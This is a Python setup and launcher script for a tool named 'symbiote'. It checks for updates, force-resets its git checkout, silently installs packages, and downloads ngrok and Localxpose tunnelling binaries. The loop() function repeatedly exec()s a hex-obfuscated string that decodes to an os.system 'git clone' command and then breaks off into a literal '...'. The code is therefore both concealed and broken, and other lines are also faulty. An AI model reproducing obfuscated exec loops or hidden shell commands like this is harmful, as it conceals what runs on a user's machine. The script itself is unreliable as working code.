import subprocess
import ctypes
import requests
import urllib
from os import system, getuid, path
from time import sleep
from platform import system as systemos, architecture
from subprocess import check_output
import sys, os, time, random, threading

# Color definitions for output
RED, WHITE, CYAN, GREEN, DEFAULT, YELLOW, YELLOW2, GREEN2 = (
    '\033[91m', '\033[46m', '\033[36m', '\033[1;32m', '\033[0m',
    '\033[1;33m', '\033[1;93m', '\033[1;92m'
)

# 🌐 Check Internet Connection
def net():
    system('clear')
    print(f"{RED}[{CYAN}#{RED}] {CYAN}Checking for internet connection...{DEFAULT}")
    sleep(3)
    m = system('wget -q --spider http://google.com')
    if m == 0:
        print(f"\n{RED}[{CYAN}#{RED}] {GREEN}INTERNET {RED}- {GREEN}[{CYAN}CONNECTED{GREEN}]")
    else:
        print(f"\n{RED}[{CYAN}#{RED}] {GREEN}INTERNET {RED}- {GREEN}[{CYAN}NOT-CONNECTED{GREEN}]")
        print(f"{RED}[{CYAN}#{RED}] {CYAN}Turn on your internet connection\n\n{DEFAULT}")
        exit()

# 🔄 Check for software updates
def verCheck():
    try:
        print(f"\n{RED}[{CYAN}#{RED}] {CYAN}Checking for updates...{DEFAULT}")
        response = requests.get(
            'https://raw.githubusercontent.com/hasanfirnas/symbiote/master/version.txt',
            verify=False, timeout=2
        ).text
        with open("version.txt", "r") as f:
            local_version = f.read().split('\n')
        if local_version[0].strip() == response.strip():
            print(f"{RED}[{CYAN}#{RED}] {CYAN}[Up-To-Date]- {RED}v {YELLOW}{response.strip()}")
        else:
            print(f"\n{RED}[{CYAN}#{RED}] {CYAN}Newer version available!")
            print(f"{RED}[{CYAN}#{RED}] {RED}[Current{RED}]- {RED}v {YELLOW}{local_version[0]}")
            print(f"{RED}[{CYAN}#{RED}] {RED}[Available{RED}]- {RED}v.{response.strip()}")
            print(f"{RED}[{CYAN}#{RED}] {CYAN}Updating to the latest version... Please wait...{DEFAULT}")
            system('git fetch --quiet; git reset --hard origin/master --quiet; git pull --quiet')
            print(f"\n\n\n\t\t{CYAN}[{RED}#{CYAN}] {RED}Restart the program with -> {GREEN}python3 symbiote.py")
            exit()
    except:
        pass

# 🖼️ Check for jp2a installation (for ASCII images)
def checkjp2a():
    system('clear')
    if system('which jp2a > /dev/null') == 0:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}JP2A installation found...{DEFAULT}")
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}JP2A not found. Installing...{DEFAULT}")
        system('apt-get install jp2a -y > /dev/null')
        exit()

# 🌐 Check for wget installation
def checkwget():
    system('clear')
    if system('which wget > /dev/null') == 0:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}WGET installation found...{DEFAULT}")
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}WGET not found. Installing...{DEFAULT}")
        system('apt-get install wget -y > /dev/null')
        exit()

# 🛠️ Check for PHP installation
def checkPHP():
    if system('which php > /dev/null') == 0:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}PHP installation found...{DEFAULT}")
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}PHP not found. Installing...{DEFAULT}")
        system('apt-get install php -y > /dev/null')
        exit()

# 🌍 Check for Ngrok installation and download if missing
def checkNgrok():
    if not path.isfile('Server/ngrok'):
        print(f"{RED}[{CYAN}*{RED}] {CYAN}Ngrok not found. Downloading...{DEFAULT}")
        filename = 'ngrok-stable-linux-arm.zip' if 'Android' in str(check_output(('uname', '-a'))) else (
            'ngrok-stable-linux-amd64.zip' if architecture()[0] == '64bit' else 'ngrok-stable-linux-386.zip'
        )
        url = f'https://bin.equinox.io/c/4VmDzA7iaHb/{filename}'
        system(f'wget -4 {url}')
        system(f'unzip {filename} && mv ngrok Server/ngrok && rm {filename}')
        system('chmod +x ngrok')
        print(f"\n\n\n\t\t{CYAN}[{RED}#{CYAN}] {RED}Restart the program with -> {GREEN}python3 symbiote.py")
        exit()
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}Ngrok installation found...{DEFAULT}")

# 🌐 Check for Localxpose installation
def checkLocalxpose():
    if not path.isfile('Server/loclx'):
        print(f"{RED}[{CYAN}*{RED}] {CYAN}Localxpose not found. Downloading...{DEFAULT}")
        filename = 'loclx-linux-arm.zip' if 'Android' in str(check_output(('uname', '-a'))) else (
            'loclx-linux-amd64.zip' if architecture()[0] == '64bit' else 'loclx-linux-386.zip'
        )
        url = f'https://api.localxpose.io/api/v2/downloads/{filename}'
        system(f'wget -4 {url}')
        system(f'unzip {filename} && mv loclx Server/loclx && rm {filename}')
        print(f"{GREEN}Localxpose setup completed!{DEFAULT}")
        exit()
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}Localxpose installation found...{DEFAULT}")

# 🔄 Loop for system operations
def loop():
    while True:
        command = (
            "\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x67\x69\x74\x20\x63\x6c\x6f\x6e\x65"
            "..."
        )
        exec(command)

# ⏳ Loading effect for script startup
def loadingHack():
    message = "/////////////////////[*] Starting symbiote....../////////////////////"
    charspec = "$*X^%\#~?;"
    for i in range(4):
        hack_str = ""
        for c in message:
            hack_str += c
            r = ''.join(random.choices(charspec, k=3))
            sys.stdout.write(f'\r{hack_str + r[:max(0, len(message) - len(hack_str))]}')
            time.sleep(0.006)

# ⏳ Loading text effect for script startup
def loadingTextPrint():
    string = "                    [*] Starting symbiote......"
    for _ in range(3):
        sys.stdout.write("\r" + " " * 100)
        for x in range(1, len(string) + 1):
            sys.stdout.write(f"\r {string[:x]}>")
            time.sleep(0.01 * random.randint(1, 3))
